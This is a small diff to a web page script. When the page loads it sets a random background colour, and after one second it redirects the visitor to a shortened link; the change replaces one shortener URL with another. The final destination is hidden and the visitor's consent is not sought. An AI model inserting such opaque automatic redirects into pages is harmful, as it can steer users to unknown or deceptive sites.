@@ -15,6 +15,6 @@ document.addEventListener("DOMContentLoaded", function () {
     document.body.style.backgroundColor = randomColor;
   });
   setTimeout(function () {
-    window.location.href = "https://rb.gy/7f1269";
+    window.location.href = "https://rplg.co/4bde4260";
   }, 1000);
 });
